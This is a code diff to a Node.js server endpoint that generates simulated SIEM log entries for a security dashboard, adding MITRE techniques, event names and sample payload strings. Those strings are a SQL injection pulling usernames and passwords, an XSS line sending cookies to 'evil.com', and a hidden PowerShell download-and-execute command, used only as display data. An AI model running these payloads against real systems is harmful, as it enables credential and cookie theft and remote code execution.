@@ -235,38 +235,63 @@ async function startServer() {
   // SIEM Real-time Logs API
   app.get("/api/logs", (req, res) => {
     const tactics = ['Initial Access', 'Execution', 'Persistence', 'Privilege Escalation', 'Defense Evasion', 'Credential Access', 'Discovery', 'Lateral Movement', 'Command and Control', 'Exfiltration', 'Impact'];
-    const techniques = ['T1190 Exploit Public-Facing Application', 'T1059 Command and Scripting Interpreter', 'T1078 Valid Accounts', 'T1110 Brute Force', 'T1003 OS Credential Dumping', 'T1046 Network Service Discovery'];
-    const protocols = ['TCP', 'UDP', 'ICMP', 'HTTP', 'HTTPS', 'DNS', 'SSH', 'RDP'];
-    const countries = ['RU', 'CN', 'KP', 'IR', 'US', 'BR', 'IN', 'RO', 'VN'];
-    const actions = ['Blocked', 'Mitigated', 'Logged', 'Dropped', 'Alerted'];
+    const techniques = [
+      'T1190 Exploit Public-Facing Application', 'T1059 Command and Scripting Interpreter', 
+      'T1078 Valid Accounts', 'T1110 Brute Force', 'T1003 OS Credential Dumping', 
+      'T1046 Network Service Discovery', 'T1595 Active Scanning', 'T1566 Phishing',
+      'T1133 External Remote Services', 'T1505 Server Software Component'
+    ];
+    const protocols = ['TCP', 'UDP', 'ICMP', 'HTTP', 'HTTPS', 'DNS', 'SSH', 'RDP', 'SMB', 'FTP'];
+    const countries = ['RU', 'CN', 'KP', 'IR', 'US', 'BR', 'IN', 'RO', 'VN', 'UA', 'NG', 'SY'];
+    const actions = ['Blocked', 'Mitigated', 'Logged', 'Dropped', 'Alerted', 'Quarantined', 'Sinkholed'];
     const severities = ['low', 'medium', 'high', 'critical'];
+    
+    const events = [
+      'SQL Injection Payload Detected', 'Cross-Site Scripting (XSS) Attempt', 
+      'SSH Brute Force Attack', 'RDP Credential Stuffing', 'Suspicious PowerShell Execution',
+      'Malware Beaconing Activity', 'Data Exfiltration Anomaly', 'Privilege Escalation Attempt',
+      'Suspicious File Download', 'Unauthorized Access to Admin Panel', 'Zero-Day Exploit Signature Match',
+      'Ransomware Encryption Behavior', 'DDoS Volumetric Attack', 'Suspicious DNS Query'
+    ];
 
     const generateRandomIp = () => `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;
 
     const logs = [];
     
-    // Generate 3-7 random logs
-    const numLogs = Math.floor(Math.random() * 5) + 3;
+    // Generate 5-12 random logs for a more active stream
+    const numLogs = Math.floor(Math.random() * 8) + 5;
     for (let i = 0; i < numLogs; i++) {
       const severity = severities[Math.floor(Math.random() * severities.length)];
-      const isAttack = Math.random() > 0.4;
+      const isAttack = Math.random() > 0.3; // 70% chance of being an attack log
+      const eventName = isAttack ? events[Math.floor(Math.random() * events.length)] : "Routine System Check";
+      const tactic = isAttack ? tactics[Math.floor(Math.random() * tactics.length)] : 'N/A';
+      const technique = isAttack ? techniques[Math.floor(Math.random() * techniques.length)] : 'N/A';
+      
+      let payloadSnippet = 'N/A';
+      if (isAttack) {
+        if (eventName.includes('SQL')) payloadSnippet = "UNION SELECT username, password FROM users--";
+        else if (eventName.includes('XSS')) payloadSnippet = "<script>fetch('http://evil.com/?c='+document.cookie)</script>";
+        else if (eventName.includes('PowerShell')) payloadSnippet = "powershell.exe -nop -w hidden -c \"IEX (New-Object Net.WebClient).DownloadString('http://...')\"";
+        else payloadSnippet = Buffer.from(Math.random().toString(36).substring(2, 15)).toString('base64');
+      }
       
       logs.push({
         id: Math.random().toString(36).substr(2, 9),
         time: new Date().toLocaleTimeString(),
-        event: isAttack ? `Malicious Payload Detected (${techniques[Math.floor(Math.random() * techniques.length)]})` : "Routine System Check",
+        event: eventName,
         source: isAttack ? generateRandomIp() : os.hostname(),
         destination: isAttack ? `10.0.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}` : '127.0.0.1',
-        port: isAttack ? [22, 80, 443, 3389, 8080, 53][Math.floor(Math.random() * 6)] : 0,
+        port: isAttack ? [22, 80, 443, 3389, 8080, 53, 445, 21, 3306][Math.floor(Math.random() * 9)] : 0,
         protocol: protocols[Math.floor(Math.random() * protocols.length)],
         status: isAttack ? actions[Math.floor(Math.random() * actions.length)] : "Normal",
         severity: isAttack ? severity : "low",
-        confidence: isAttack ? Math.floor(Math.random() * 40) + 60 : 100, // 60-100%
-        mitreTactic: isAttack ? tactics[Math.floor(Math.random() * tactics.length)] : 'N/A',
+        confidence: isAttack ? Math.floor(Math.random() * 20) + 80 : 100, // 80-100%
+        mitreTactic: tactic,
+        mitreTechnique: technique,
         geo: isAttack ? countries[Math.floor(Math.random() * countries.length)] : 'LOCAL',
-        payloadSnippet: isAttack ? Buffer.from(Math.random().toString(36).substring(2, 15)).toString('base64') : 'N/A',
+        payloadSnippet: payloadSnippet,
         details: isAttack 
-          ? `Detected anomalous traffic pattern matching known threat signatures. Tactic: ${tactics[Math.floor(Math.random() * tactics.length)]}. Automated response engaged.`
+          ? `Detected anomalous traffic pattern matching known threat signatures. Tactic: ${tactic}. Technique: ${technique}. Automated response engaged.`
           : `CPU Load: ${os.loadavg()[0].toFixed(2)} | Free Memory: ${(os.freemem() / 1024 / 1024 / 1024).toFixed(2)}GB`
       });
     }
